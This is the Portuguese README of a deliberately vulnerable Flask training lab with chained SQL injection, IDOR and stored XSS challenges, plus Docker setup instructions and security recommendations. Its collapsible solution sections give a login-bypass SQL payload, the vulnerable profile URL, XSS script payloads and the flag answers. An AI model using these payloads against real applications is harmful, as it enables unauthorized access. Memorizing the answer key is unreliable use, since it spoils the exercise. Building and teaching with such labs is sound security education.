<div align="center">

# 🔐 VulnFlags Lab

### Laboratório vulnerável com exploração encadeada de SQL Injection, IDOR e Stored XSS

![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)
![Flask](https://img.shields.io/badge/Flask-3.1-000000?logo=flask&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)
![License](https://img.shields.io/badge/Uso-Educacional-orange)

</div>

> [!WARNING]
> Esta aplicação é **deliberadamente vulnerável**. Execute somente em `localhost` ou em uma rede de laboratório isolada. Não publique o serviço na internet.

## 📖 Sobre o projeto

O **VulnFlags Lab** é uma aplicação web criada para apresentações, treinamentos e atividades práticas de segurança ofensiva.

A exploração principal segue uma cadeia obrigatória:

```text
SQL Injection → Sessão administrativa → Portal Financeiro → IDOR
```

O laboratório também possui um desafio independente de **Stored XSS**.

Todos os nomes, documentos, endereços, contas bancárias e valores apresentados são **sintéticos e fictícios**.

## 🎯 Desafios

| Desafio | Categoria | Objetivo |
|---|---|---|
| 01 | SQL Injection | Contornar o login e obter uma sessão administrativa |
| 02 | IDOR | Acessar um perfil que não pertence à sessão autenticada |
| 03 | Stored XSS | Armazenar e executar JavaScript no navegador |

### Exploração encadeada

O Portal Financeiro permanece bloqueado até que o participante conclua a etapa de SQL Injection. Após obter a sessão administrativa, o participante acessa o próprio perfil e investiga se outros objetos podem ser consultados sem validação de propriedade.

## 🧰 Tecnologias

- Python 3.12
- Flask 3.1
- SQLite
- Jinja2
- Docker
- Docker Compose
- HTML e CSS responsivos

## 📁 Estrutura

```text
vulnflags_lab/
├── app.py
├── Dockerfile
├── docker-compose.yml
├── requirements.txt
├── README.md
└── templates/
    ├── base.html
    ├── comments.html
    ├── dashboard.html
    ├── index.html
    ├── locked.html
    ├── login.html
    └── profile.html
```

## 🚀 Execução com Docker

### Pré-requisitos

Confirme que o Docker e o Docker Compose estão disponíveis:

```bash
docker --version
docker compose version
```

Baixando o Docker no WSL
```
apt update
apt install -y ca-certificates curl
```
Adicione o repositório oficial do Docker:
```
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
chmod a+r /etc/apt/keyrings/docker.asc
```
Agora configure o repositório:
```
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" > /etc/apt/sources.list.d/docker.list
```
Instale os componentes do Docker, incluindo o Compose:
```
apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```


### Iniciar o laboratório

Clone ou baixe o repositório e entre na pasta do projeto:

Para Baixar o docker do CTFd
```bash
cd /home/kali/ctfd-escola-ptbr
docker compose up -d --build
```
---

```bash
cd vulnflags_lab
```

Construa a imagem:

```bash
docker compose build --no-cache
```

Inicie o container:

```bash
docker compose up -d --force-recreate
```

Acompanhe os logs:

```bash
docker compose logs --tail=50
```

Acesse no navegador:

```text
http://127.0.0.1:5000
```

### Linux ou Kali com `sudo`

Caso o usuário não tenha acesso direto ao daemon do Docker:

```bash
sudo docker compose build --no-cache
sudo docker compose up -d --force-recreate
sudo docker compose logs --tail=50
```

### Verificar o funcionamento

```bash
docker compose ps
curl -i http://127.0.0.1:5000/
```

### Encerrar

```bash
docker compose down
```

## 🧪 Como realizar os desafios

> [!TIP]
> Esta seção apresenta o caminho de resolução. Se o repositório for usado em uma competição, remova esta seção ou mova as respostas para um material exclusivo do instrutor.

### 1. SQL Injection

Acesse **Etapa SQLi** e analise o formulário de autenticação.

<details>
<summary><strong>Exibir orientação e payload</strong></summary>

No campo de usuário, utilize:

```text
' OR role='admin' -- 
```

No campo de senha, informe qualquer valor.

Ao obter a sessão administrativa, o dashboard libera o Portal Financeiro e apresenta a primeira flag:

```text
CPF 123.456.789-00
```

</details>

### 2. IDOR

Após concluir a SQL Injection, abra a conta administrativa. Observe como o recurso de perfil é identificado na URL e teste outros identificadores no mesmo padrão.

A flag deve ser montada com:

```text
3 primeiros números do CPF + saldo inteiro
```

Remova do saldo o símbolo de moeda, pontos, vírgula e centavos.

Formato esperado:

```text
FLAG{CPF3_SALDO}
```

<details>
<summary><strong>Exibir gabarito do IDOR</strong></summary>

O objeto vulnerável está em:

```text
/profile/9
```

Dados relevantes:

```text
CPF: 987.654.321-00
Saldo: R$ 8.750.000,00
```

Normalização:

```text
CPF3 = 987
SALDO = 8750000
```

Flag:

```text
FLAG{987_8750000}
```

</details>

### 3. Stored XSS

Acesse **XSS bônus**, publique um comentário e verifique se o conteúdo é renderizado sem tratamento adequado.

<details>
<summary><strong>Exibir payloads</strong></summary>

Validação básica:

```html
<script>alert(1)</script>
```

Obtenção da flag:

```html
<script>fetch('/api/xss-flag',{headers:{'X-XSS-Lab':'executed'}}).then(r=>r.text()).then(alert)</script>
```

Flag esperada:

```text
FLAG{STORED_XSS_EXECUTED}
```

</details>

## 🔄 Reset do laboratório

Para remover o container e reconstruir a aplicação:

```bash
docker compose down --remove-orphans
docker compose build --no-cache
docker compose up -d --force-recreate
```

## 🛠️ Solução de problemas

### `TemplateNotFound`

Confira se a pasta `templates` está no mesmo diretório do `Dockerfile`:

```bash
find . -maxdepth 2 -type f | sort
```

Confira os arquivos dentro do container:

```bash
docker compose exec vulnflags ls -la /app/templates
```

### `Connection reset by peer`

Verifique se o Flask está escutando em todas as interfaces internas do container:

```bash
docker compose logs --tail=50
```

O log deve incluir:

```text
Running on all addresses (0.0.0.0)
```

### Porta 5000 ocupada

Linux:

```bash
sudo ss -lntp | grep :5000
```

Windows PowerShell:

```powershell
netstat -ano | findstr :5000
```

## 🛡️ Recomendações de segurança

Este projeto representa controles implementados de forma propositalmente insegura. Em aplicações reais:

- Use consultas parametrizadas para acesso ao banco de dados.
- Valide autorização no servidor para cada objeto requisitado.
- Não confie em identificadores fornecidos pelo cliente.
- Codifique conteúdo não confiável antes de renderizá-lo.
- Utilize políticas de segurança de conteúdo adequadas.
- Não armazene senhas em texto simples.
- Registre e monitore tentativas anormais de acesso.

## ⚖️ Uso responsável

Este laboratório foi desenvolvido exclusivamente para:

- educação em segurança da informação;
- demonstrações técnicas autorizadas;
- treinamentos de desenvolvimento seguro;
- atividades em ambientes controlados.

Não utilize os conceitos ou payloads apresentados contra sistemas sem autorização expressa.

## 🤝 Contribuições

Contribuições voltadas à melhoria visual, documentação, acessibilidade, correções e novos desafios educacionais são bem-vindas.

Antes de enviar uma alteração:

1. Crie uma branch para a mudança.
2. Mantenha os dados do laboratório totalmente fictícios.
3. Valide a execução com Docker Compose.
4. Documente alterações que afetem flags ou fluxo dos desafios.

## 📄 Licença

Defina uma licença antes de publicar o repositório. Para uso aberto, considere adicionar um arquivo `LICENSE` compatível com o objetivo educacional do projeto.

---

<div align="center">

**VulnFlags Lab** • Segurança ofensiva com responsabilidade

</div>
